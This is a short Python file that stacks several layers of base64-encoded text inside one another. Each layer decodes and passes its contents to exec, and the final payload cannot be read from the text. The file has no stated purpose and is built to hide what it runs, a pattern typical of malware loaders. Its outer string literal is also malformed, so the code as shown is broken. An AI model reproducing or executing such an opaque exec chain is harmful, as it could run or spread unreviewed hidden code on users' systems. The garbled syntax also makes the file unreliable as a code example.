import base64
x=("import base64
x=("aW1wb3J0IGJhc2U2NAp4PSgiYVcxd2IzSjBJR0poYzJVMk5BcDRQU2dpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0RSUVUyZHBXVlpqZUdReVNYcFRha0pLVWpCd2IxbDZTbFpOYXpWQ1kwUlNVVlV5WkhCWFZscHFaVWRSZVZOWWNGUmhhMHBMVlc1d2MwNXNSWGxOV0U1clVqQTFTVlF4YUhOaE1VVjNVMnBXV0dKSGFFaFVWbHAzVjFaU2NWRnRjR3ROTUVvd1YxUkpkMDVYVWtaaVJXaFZZbXh3Y0Zsc1ZUQmxSbXQ1VGxWMGFWSXdjREZXVm1oWFdWZEtjMWRZWkdGU2JXaE1XV3RrVDA1V1JuVlJiV3hZVWxWdmVWZFVTVEZWYkc5NFYydG9hRk5IZUdoV2FrSmhZMnhhVmxsNlZtdGlWWEJIVm0xd1UxbFdXWGRPU0doaFVsZE5NVnBXVms5a1IwcEpWVzF3VTJWdGR6RlhhMVpQVVRBeFNGSnNhRTVXTTJoRlYycEpOV05XVGxaV2EyUk9WakZLU1ZsVmFHRmhiVXB5VFVSS1ZGWldXa2hWVkVaU1pESlJlbFZzVWxOV1ZuQkdWbGh3UTFZeFZYZGhNMmhXWWxob2NGVnFSbUZrVm10NVRWVmthMUpVYkhsVlYzUjNWVEZLY1dKRlRsWldNMDB4VmtaYWJtUXlSa1pUYkVwT1UwWktTRlpzWkd0a01VVjRWVmhvVm1KV2NGaFZiRkp6VkZaV2MxWlVRbUZOVlVwVlZWWmpNVlF5Vm5OU2FscFZUVVpLZVZSVlZURlNWa1paWTBVMWFHSnJTa1JXVmxwWFZqRlplRnBGWkZSaGEzQnhWbXBHZDFSc2NFZFpNMmhUVFd4YVJsWnRkRk5VTURGeVlucEdXRlpzY0doVlZFWkhZMnhTV1ZWc1FsTldXRUpWVmxkNGEyRXhUa2hWYmxaaFUwZG9XVlpVU2s5VVJsWlZVVzA1VW1KR2NFaFVNVlozVlRGS2NrMVhOVlpTYXpWRVYxZDBkMDVzWkZWVWF6Vm9ZbGhOZUZaRVFsTmpiVkYzVFZaV1ZWWjZWazVWVkVKSFpGWlNkR05HU214V1ZGWldWVEZvYjFSdFZuTmhNMlJWWVRBMWNsZHJWbk5TUmtaWVlqTnNWRTFzY0dGWk1uQnpUVlpTVlZOcmVHbE5iVTQxVkd0b2QxZHRUa2xpUlZaWVYwVkZNVmxXYUhabFYwNVlUbGRzYUdFd1dqTlZNbmhUVm14S2NtRkdUbGRoYlhoSlZtdFNRMDVHU2xkVGJHUlVWakpTVWxaVVFrZGtWbEpGVkdzNVRsSXdiRFpWTWpGdldWVXhjMVpxU2xoaVIwNDBWRlprUzFOR1NuRlJiVVpYVFZWWmVWWkdWazVPVmtwWFVsaGthVkpVVms1VVZWVXhZakZzYzFwR1pHeFdiWGhWVjFSQ01GWnRSWGhYYkU1WFlrWmFXRlpyV21GU01EbFhWMnhhYUUweVVuVldWVnBQVVcxS2RGSnJiRlpoYTBweFZUQlZkMDFzVWtsaGVsWm9VakExU1ZsVVRsZGhNVWw0VjI1d1dHSkhVbkphVmxwelYwVXhTVlp0YkU1TlNFSXhWVEkxYzFGc2IzZGlSRnBPVWxoU1dGbHJWa3RWUm1SRlVXczVWRlpyY0ZkV1IzUTBWMVV4VjFkc1VsZFNWVFZEVkRGV2MxSkdjRWhQVjNSVVVtdHZlbGRVVG5ka2JWSnlaRE5zVTJKdFVtOVdXSEJXWkRGa2MxcEVVbWxTYlRrMlZUSXhiMkZXVmpaV2FrcGFUV3BHY1ZsdGRITlNSa1pZWWpOc2FsWjZWbUZaZWs1elVsWmtkR0ZFUW1sV1YwNDFWWHBKTlZSR1JYbE5WazVwVW01Q2QxVlhOVU5oYXpGVllUTnNXazFIVFhoWGJYaHpWMFpTY1ZGdGFGaFNia0o2VlhwQ1QyTnJOWEpVYmtKU1ZqSlNTMVZVUWtkalJrNVlZa1YwVTFJd1drbFdiVEYzWVVkV1ZsTnVaRmhpVjNoRVZGVmtSMU5HV2xoYVJtUnBVbFZ3VVZVeFZtdGpNbFp5WWtWb1UySllRbkpWYWtvelpWWmtjMVJyVG1oV01WcFZWVmMxVTFkc1dYcFZibVJhWWxSR2NWZHFSbk5XUmtaMVlrZEdXRkpXYkRSV01uaHZWREF4Um1KRmJGWmliSEJMVldwQ1lVMVdUbFphUm1SUFVqRktTVlp0TlhOaFYwcFdWMjV3VkZaWGFGQlphMlJQWkZaa2RWRnNjRTVpUmxsNFZURmtjMU50UmxaVWJrSlNWakpTUzFWVVFrcGtNV3Q1VGxoS1QyRXdOWGRWVm1SclUyeEZkMUp0TlZSV1ZUVkRWMnBLVDJSR1duVmpSM0JUWlcxM2VGZFljRXRXYkc5NFVXeFNVbUp0ZUdoV01GWmFaVVprYzJGRk9VNVNNRFF4Vkd4ak1WbFdaRWRTYmxwWFlsaG9SRlpFUm01a01WSnlZa1pPVjFaVVZrNVdNRkpIVmpGVmVGVnJVbXROYlZKeVZXcEtORTFHWkhOWmVsWk9WakZLUmxSVlVrZFVSbFpZVDFjMVZGWlZOVU5YYWtKelVrWkdXRnBGY0ZSU1dFSjZWMnRXYjFZeVZsaFRia0pTWW0xNGFGWXdWVEZOTVd4eFUxUkdiR0pJUWxWVWJHaDNZVEZKZDFkWVpHRlNiV2hRVjIxNGNtVlZPVmhrUjBaV1RVVlZNVlpWV2s5UmJWWldUVlZXVWxaWVVrdFZWRUpIWW14T1ZscEdaRTlTYlhRMVZtMDFhMkV4UlhkVGFsWllZa2RvU0ZSV1duZFhWbEp4VVcxd2JGWkdXbFZXTW5odlVqQXhWMk5HYkZWaGEwcFVWakJrYjJOV1pITmhSVTVPVWpCYVdWUXhhRmRWUm05NVQxYzFWRlpWTlVOWGFrSnpVa1pHV0ZwRmNGUlNXRUo2VjJ0V2IxWXlWbGhUYmtKU1lUSlNZVlpxVG05T2JHUnpVbTVhVkUxWVFrbFdiVEI0VTJ4T1JrNVlUbHBpVkVaVVYyMHhSMWRGTVZoaFIwWk9Za1phTWxkV1dtcGxSMFpIWWpOc1YySldjSEZWYWtKYVpERnNWbFJxVG1GTlYzUTFXVlZrYjJFeFNuRmlTR1JZWVRBMWVWUnRkRTlqUmtaWVdrVndVazFGV25kVk1XUnpVekZhUjJOR2FFOVdNMUpMVldwQ1lVMVdUbFphU0U1clVtMTRXVmRyWkRSVGJFNUhVMnBLVkZaWFVrZFhha3BPWld4R2RHVkdjRTVpV0dnd1YxWmFhMVl5UlhkaVJXUldZbGhvY0ZWcVJtRmtWbXQ1VFZWa2ExSlhlRWxXUnpBMVYyeGtSMUpxUmxSV01uaExXVlpXVDJOR1JsaGFSWEJTVFVWc05sZFdXbTlWTWtsM1lrVm9VRmRIVW1oV2JuQlRaR3hzVjFremFHaFNiVGsxVm0weFlXRnNTWGRYV0dSYVZsVTBlbGRxUW5abGJFNTBZa1YwYkZZelVuVldNVnB2Vkd4dmVWSnNhRTVXTW1ob1ZGZDRZV0pXWkhSTldFNXFUVmhDVmxscVFqQlRiRVYzVW0wMVZGWlZOVU5YYWtKelVrWkdkV0pIUmxoU1ZtdzBWako0YjFRd01VaFVhbFpQVjBkU2NGUlVRVEJrTVUxM1drWndhV0pWV2twV1YzQkRZV3hPUmsxRVNsVlRSM014V1ZWa1QxTkhSWHBXYlhSVFRWWndObFl5ZUd0aE1sWlhZa1pvVGxOR1duQlVWRUozWkZaU1JWTnJkR3RpVmtwS1drVldUMVpWTVZkVGJURlhZVEZWTVZaRldrdFdhelZWWWtVeFRrMUVWbnBYVnpCNFZURldXRkpyYUZCV1JVcHdXbFprVDJWc1RsWlNibHBoVFVkNFJWVldaR3RUYkVWM1VtMDFWRlpWTlVOWGFrSnpVa1pHV0ZwRmNGSk5SVnAxVlRGV1QxRnNiM2RpUlZKU1ZqSlNhRlZxUWxwa01XUlhWVmhvVDAxSE9UVldSekExVjJ4a1IxTnRNVnBXYlZKVFdXMXpOV05HUm5SalIyaFRUVVpzTTFZd1VrdGpNa1Y1VjJ4U2EwMXRVa1ZaVmxaSFlteE9WbFJyU21GTlIzaEZWVlprYTFOc1JYZFNiVFZVVmxVMVExZHFRbk5TUmtaWVdrVndVazFGV25WVk1WWlBVVEpLV0ZKc2FHeFNNMmh4V2xkd1JrMHhUbkZVYTA1cFRXdHNObFpYTldGVE1sWjBUMWMxV2xadFRqUlpWVnAyWlZaYWRGZHRSbWxXTTJnMlZqSjRibVF5VGtaVWJUVnFVak5TYUZacVJuTmliR3QzWVVWMGFsSXdjREZXVnpGaFlWWlplRmRxV2xwbGEzQklXVzE0ZDFZd09WVlViV2hZVW10d01sWXdVa3RqTWxKWVZXdG9WMkp0ZUhKWmJGWmhaV3hOZDFremFHbFNNREUyVmtjeGIxbFZNWE5XYm5CVVZsZFNlbHBHWkZOVFJscDFZa2QwYVZaV2NEWldSVlpQVVRKV1YyTkdiRkppV0doaFZqQmFSMlF4VVhsYVNGcGhUVWQ0UlZWV1pHdFRiVVpXWWtoQ1YxWlhhRXhaTUdSTFpGWldXRnBHY0ZaTlJXOTNWako0YjFReVZuTmlSbWhoVWpOb1MxVnFRbHBrTVU1V1lVVTVhMDFZUWxsV1J6VkRXVmRLV0dWSVRsaGhNRFZFV1RCa1MyUldWblJsUjNCcFlraENkbGRYZEc5VWJWSldZa2hDVkZZeWVFVlpWbFpIWW14T1ZsUnJUbWxXTUd3MlZURmthMWRYVmxaVGJtUmFZbGQ0UkZwV1duTlhSVFZZVGxkR1ZrMXRaekZXTW5odlVUSktSMkpHYkZaWFJVcFJWMnBKTldKc1RsWlVhMHBoVFVkNFJWVldaR3RUYkU1R1UycFdXbFp0VFhoVVZWWXdVMFV4V0dWSGNFNU5SRloyVmpKd1MxWnRUa1pVYmtKU1ZqSlNTMVZVUWtkaWJFNVdWR3RLWVUxc1NrbFphMmhUV1ZaV05sWnFXbHBoTWxKWVdXdGtUMUpIUmtsUmJXeHBZa1Z3ZWxkVVNURlpWMFpJVTJ0U2FFMUlVa1ZaYkZwTFl6RmtkR0pGVG1oaVZWcEpWbTB4ZDJGRk1WVmlSRlpZWWtkb1NGUldXbmRYVmxKeFVXeHNUazFFVWpOV01WcHZWVEF4V0ZScVZtRk5NRXBSVjJwSk5XSnNUbFpVYTBwaFRVZDRkMVV4WkhOVmF6RjBZVWhPV0ZaRmNEWlhha3BIVjBaa1dGcEhkRk5OYldoNlZURldiMU15U2toVWJHeFhZbGhvY1ZSVVJrZGliSEJHV1hwU1lVMXNTa2xaVldRMFUyeEplRmRVUW1GU1YxSllXbFprUzJSR1NuVlVhM0JVVWxSV00xZHJWbXRXYkc5NVZWaHNVMkp1UWt0Vk1GVXdaVVprVlZOck9XbFNNREUyVmtjd2VHRXhXWHBhUkVaVVZqSjRTMWxXVms5alJrWllXa1Z3VWsxRmJ6RldNbmh2VkRKUmVWTlliRTlYU0VKb1ZsUkNSazVXVGxaaFJYUnBVakExV2xadE1UUmhhekI0VTJwYVZWSjZSbkpaYTJSVFVrZEdSMVJzVGxkaE1YQllWbGQ0WVZReFdsZGFNMmhYWWtVMVZsVlVTakJVUms1V1ZHdEtZVTFIZUVwVk1qRTBZVEZPUjFkcVZscGlWM2hFV2xaYWQxZFdVblZhUjJ4T1lXeFpNbFl5ZUU1TlYxWjBWV3RvVTJGclNuSldNRlV4WWxaa1ZWTlVWbWhOV0VKVlZWWlNjMVZXVlhkU2FsWlZWbFpLUTFWNlFrOWtSbFowWlVkR2FGWlZiM2RXTVZwcll6SlNWbVJGVW1obGJIQkZXVlpXUjJKc1RsWlVhMDVxVW01Q2QxVlhOVmRoVlRCNFVtMDFXbFp0YUZCWGJURlRaRlpHZFZac2JFNWhNWEI0VjJ0V2EyTXdNWE5qUmxKaFRUQktVVmRxU1RWaWJFNVdWR3RLWVUxSGVFVlZWbVJyVTJ4T1JsTnFWbHBXYlUxNFZGVldNRkpHVG5SVWF6VlRVbFJGTWxacVRuZFViVlpJVTJ4a1dHSkZXbFpaVmxaTFpERnJlbUpGVG10V01HdzJWbFprYTFkc1dYZE9TR1JhVm0xb2FGbHJWalJqUmtaelZXMTBVMlZ0ZDNwWFZFSnJZekpTVjJORVZsSmhhMHB2VldwR1YySnNiRFpUYXpsc1ZqQmFXbFZYY0VOVVYwWldZa2hrVWsxdGVFTlhha0p6VWtaR1dGcEZjRkpOUlZwMVYxUkplRll3TVVoVmJHeFVZbXhhUlZkcVNUVmliRTVXVkd0S1lVMXNTbHBXUnpFMFlXMUtWVlp0T1ZwaVIxSlhWMnBHUTFaR1JuVlJiV3hwWVRCc05GZHJWazlpYlVaWFlVVldVbGRJUWs5VVZtaFBUbXhSZDFWdWNFNVdWR3N5VlRGb2ExVkdXalpTYTJSYVlsUldWRmxyWkU5alJrWnhVVzFvVTAxV1duVldiWFJyVWpKV1YySXpiRmRoYTBwTFZXMTRTMk14YkhKYVJtUnBZbFUxTUZWdE5WTlRiRXB6VjJwYVdHSkhhRXhhUmxwelYwVXhXR1ZHYkZOU1ZWa3lWa1pTUjJWdFZuSk5WbWhPVWtad1MxVlVRbk5rTVVWNVlrVktZVTFIZUVWVlZ6VnJZVzFLV0dWRVJtRlNWVFYyV1d4V2MyTXlVWHBhUlRWc1lYcFdjRlpHYUhkWlYxSkhWbGh3Vm1KWGFIRlpiWGhIWW14c05sTnNaR3RXYmtKSldXdG9WMWxYVmxaVFZFWmFZV3MxV0ZwV1ZuTlRWazUwWlVkd1UyVnRkekZYYTFaUFVUQXhTRk5xVmxKaVZUVlBWV3RWZUU1c1dYcGpSVFZzVWpCd1dscEZVa2RoYXpGelYycFdXbUpVUmtoYVJWcDNWMVV4U0dKRmVGWldlbXhOVlRGV1QxRnNiM2RpUld4U1ltMTRiMVp1Y0Zaa01XUkZVMWhvYVZJd01UWldSekZ2V1ZVeGMxZHRNV0ZTUlhCNlZGVmtSMUl3T1ZsUmJXeHBZa1Z3ZWxkVVNURlpWMFpJVTJ0U1lVMXRlRnBWYTFaSFRteFNWVkp1Y0d4aGVsWlpWRlphVTJFeFNYZFhhbFpoVWxVMVMxbDZRbk5TVmtaWlZtczVWazB5VW5WV1JscFBZMnhOZDFSdVFsSldNbEpMVlZSQ1MyUXhaSFJpUlU1clZqQnNObFpXWkd0WGF6RjBZVWhPV0ZaRmIzZFhiVEZQWkVaYWRXRkhkRmROVm04eVYydFdXazVYVm5SVmEyaFRZV3RLY2xZd1ZYaGtiRTE0Vlc1YVZFMUhlRVZWVm1SclUyeEZkMUp0TlZSV1ZUVkVXa1JLVDJSSFNrbFdiWFJTVFcxU2QxWXdWbE5SYlZaeVRVaG9hazB6UWs5V2JuQkhWa1prYzJGRlpFNVdia0phVmtkd1ExTnNUa2RUYWtwVVZsZG9WRmxxUm5kV1JrWjFZMGRvV0ZKcmNIcFZNVlpyV1ZkR1NGSnNhR3hTTTJob1ZWaHdVMkpzV2xWVWJFNXJZbFUxU2xWWE5VTmhWMHBZVkcwMVlWSlhVblpaYTFaelUxWlNkR05IY0dsV00yZDZWMnRXVGsxSFJsWmtSa3BwVFcxU1MxVlVRa2RpYkU1V1ZHdEtZVTFIZUVwVk1qRTBZVEZPUjFkcVZscGlWMUl5VlhwQ2MxSkdSbGhhUlhCVFRXNW5kMVl4V210aE1rcElWR3BXVWxaSGVFdFZiVFZUWkVaT1ZscEhSbXRpVlRWM1ZWY3dlRk5zU1hsbFJFWlVWbGROTVZwWGREUmtSMVpKVVcxd1RrMVZjSGxYVmxwdlUyMUplRlJzV2s1V1ZYQlVWRlZhWVdKV1ZuUmplbFpWVm10d1IxWnRlRTlVUmxWM1UyNWtXR0pYZUVSWmJGWTBaRVphZFZadFJsUlNWRkkyVjFaYWIxVXlTWGRrUlZKaFRXcFdUbGx0ZEV0TlZtUjFZa2R3YWsxSGVFVlhWRTVYWVVkS2NsTnVWbFJpYlhkNlYycENkMDVWTlZsU2JYQlRUVlp3TVZVeU5YTmpiVTVIWVVaS2FVMUlVa3RWVkVKSFlteE9WbUZIZEdwU01VcEpWMnBLYTFZeFNYbGhSRlpZWWtkU1NGbFVSbGRUUlRsWlYyMXNVMVpzYTNkV01uaHJWREF4V0ZWcmFGQlhSM2hOVlZSS01HSnNaRmRoUlRWaFRWaENXbGxWWkRSWGF6QjRWMWhrV21Gck5VdFViWFJQWTBaR1dGcEZjRkpOUlZwMVZURldUMUZzYjNoalNGWlhZV3RLY2xZd1ZuZGpNV3Q2WWtWS1VGWlhlRXBhUldRMFlrWkplRmR1Um1GU2JXaFVXa2N4VDJORk5WbGpSM1JYVFVoQmQxZFdXbTlWYlVsNVZGaHNWMkpzV21oVmJYQnpaREZzYzFwRlpHbGlTRUpWV2tSS2EyRlZNSGROVkVaYVRVZFNTRlJWWkVkU1JUVlpVbTFzVG1KWVozaFZla0pYWXpGU2MxSnNXbUZTVm5CYVZGVmFkMVZXV2taV2JFNVRZa1phZDFwRVNtdGhSbG8yVW0wNVdHRnJjRmRaTUZZMFVrWkdkR05IYUZOTlJtd3pWakJTUzJNeVJYZGtSbFpwVFcxU2IxWnVjRWRpTVdSeFUyeGFZVTFZUWpCVU1XaHpVMnhKZDA1WVdsaFdiV2hVVjIweFIxZEdWbGhhUjJoWFpXeEtkVlpXVWtOaU1VWnpWMnRrVUZaWVFsUlZiWE40WW14a2RFMUVWbXhXVjNoSldXdG9VMWRzV1hsVmJrNVVWbGRTZWxwR1ZuTlRSMHBKVld4d1YwMXNTbnBYV0hCT1pERk5kMkpGVWxKV01sSkxWVlJDUjJKc1RsWlVhMDVwVmpCc05sVXhaR3RaVjBwelYxaGtZVkp0YUV4WmExWnpVMGRLU1ZacmNGTk5WemswVjJ0V2IxWXlWbGRqUm14VlZrWndSVmxXVmtkaWJFNVdWR3RLWVUxSGVFVlZWbVJyVTJ4RmQxSnROVlJXVjFKNldrVmFjMWRHY0VobFJteE9ZV3hhZGxkWGVHdFdiRzk0VVd4U1VtSlVSbkpXTUZwS1pVWnJlVTFXWkd4aVIwNDFWakp3UjJFeFRrZFhhbFpZWWtac00xVjZRbk5TUmtaWVdrVndVazFGV25WVk1WWlBVV3h2ZDJKRlVsSldNbEp5VlRCV2RrMVdVWGxhU0ZwaFRVZDRSVlZXWkd0VGJFVjNVbTAxVkZaVk5VTlhha0p6VWtaR1dGcEZjRkpOUlZwMVZqSXdNVll3TVVoVmJHeFVZbGhvVGxsdGRIZGpNV3cyVkd4a2FrMXNTa1ZYYWs1RFVrZEdWbEp0TlZSV1ZUVkRWMnBDYzFKR1JsaGFSWEJTVFVWYWRWVXhWazlSYkc5M1lrVlNVbUp0VW5GWmJHUTBUVlp3UmxSdE9XbFdWM2g2V2tST2ExUnRWbkpPVjJ4VlYwaENURnBGV21GVFIwWklaVVZ3VkZKWVFucFhWRUpxVGxkV1dGVnJVbEpoYXpWaFZqQlZlR0pzYkRaVWJHUm9WakJ3V1ZsclVrTmhNVWw0VjI1S1ZGWlhhRkJVVmxweVpWWlNkR1ZIY0U1TlJGWXdWMnRhYTA1SFRYbFdiRkpQVWpKNFRWWldZelZpYkU1V1ZHdEtZVTFIZUVWVlZtUnJVMnhGZDFKdE5WUldWVFZFV1d0a1YxTkdVblJsUjNCVVVtdGFkVlpYZUc5aU1rWnpZMFpzVW1GclNtOVdibkJ6VFZaT1ZscEZaR3hoTW5oSlZteFNZVkpIUmxaU2JUVlVWbFUxUTFkcVFuTlNSa1pZV2tWd1VrMUZXblZWTVZaUFVXeHZkMkpGVWxKaWJWSnhXV3hrTkUxV2NFWlViVGxwVmxkNGVscEVUbXRVYlZaeVRsZHNWVmRJUWtoYVJWcExWMVpPZFdKSGJFNU5SM2gzVlhwR1IyUnNUWGxTYkdoWVZqSlNXbFJXVW5OTlZtUlhXVE5vYVZKdFpEUlVNR1JyVlZaYVJWRnROVlJXTTJNeFYyMHhTMWRHU25WUmJXeHBVa2Q0ZEZVeFpIZGtiRTEzWWtWU1VsWXlVa3RWYm5CSFlqRnNWMWw2UW1sTlNGSlRXVzV2ZDJGVmRGSmpSM2hzVWpGYWNWTXdaRXRoUjAxNVZsUktUMUY2Vm5CVWJYQlRZVEZ3V0ZSdVdtRlNNVloyV2xWT2NtTkRTWEJEYlZZMFdsZE5iMWx0Um5wYVZGa3dURzFKTWs1SFVteFpNamxyV2xOb05FdFRhejBpS1FwbGVHVmpLR0poYzJVMk5DNWlOalJrWldOdlpHVW9lQ2twIikKZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKHgpKQ==")
exec(base64.b64decode(x))")
exec(base64.b64decode(x))